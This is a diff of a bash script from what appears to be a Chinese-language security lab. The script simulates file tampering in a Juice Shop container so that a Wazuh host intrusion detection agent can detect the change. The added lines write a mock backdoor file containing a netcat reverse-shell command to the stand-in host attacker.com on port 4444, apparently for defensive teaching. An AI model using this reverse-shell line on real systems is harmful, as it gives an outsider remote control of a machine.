@@ -22,12 +22,14 @@ fi
 echo ""
 
 # 2. 模拟文件篡改（在 Juice Shop 容器中创建可疑文件）
+#    Wazuh Agent 通过只读挂载的 juice-shop-data 卷检测这些变化
 echo "[Step 2] 模拟文件篡改攻击..."
 echo "  创建可疑文件（模拟后门）..."
-docker exec juice-shop mkdir -p /tmp/.hidden 2>/dev/null || true
-docker exec juice-shop sh -c 'echo "#!/bin/bash" > /tmp/.hidden/backdoor.sh' 2>/dev/null || true
-docker exec juice-shop chmod +x /tmp/.hidden/backdoor.sh 2>/dev/null || true
-echo "  ✓ 可疑文件已创建: /tmp/.hidden/backdoor.sh"
+docker exec juice-shop mkdir -p /app/tmp/.hidden 2>/dev/null || true
+docker exec juice-shop sh -c 'echo "#!/bin/bash" > /app/tmp/.hidden/backdoor.sh' 2>/dev/null || true
+docker exec juice-shop sh -c 'echo "nc -e /bin/bash attacker.com 4444" >> /app/tmp/.hidden/backdoor.sh' 2>/dev/null || true
+docker exec juice-shop chmod +x /app/tmp/.hidden/backdoor.sh 2>/dev/null || true
+echo "  ✓ 可疑文件已创建: /app/tmp/.hidden/backdoor.sh (通过共享卷被 Wazuh Agent 监控)"
 echo ""
 
 # 3. 模拟权限提升尝试
@@ -50,13 +52,18 @@ echo ""
 
 # 6. 验证文件监控
 echo "[Step 6] 验证文件完整性监控..."
-docker exec juice-shop ls -la /tmp/.hidden/ 2>/dev/null || echo "  (目录不存在)"
+echo "  Juice Shop 容器中的可疑文件:"
+docker exec juice-shop ls -la /app/tmp/.hidden/ 2>/dev/null || echo "  (目录不存在)"
+echo ""
+echo "  Wazuh Agent 监控的目录:"
+docker exec wazuh-agent ls -la /monitored/juice-shop/tmp/.hidden/ 2>/dev/null || echo "  (Wazuh Agent 可见但未匹配到监控路径)"
 echo ""
 
 echo "============================================"
 echo "  结论"
 echo "============================================"
-echo "  Wazuh Agent 监控主机文件系统，检测文件变化和可疑进程。"
+echo "  Wazuh Agent 通过共享 Docker 卷 (juice-shop-data) 监控"
+echo "  Juice Shop 容器的文件系统变化，检测文件篡改和可疑进程。"
 echo "  HIDS 从主机内部视角发现威胁，是安全防御链的关键一环。"
 echo "  下一课：添加 SIEM (Wazuh Manager) 聚合所有安全日志！"
 echo "============================================"
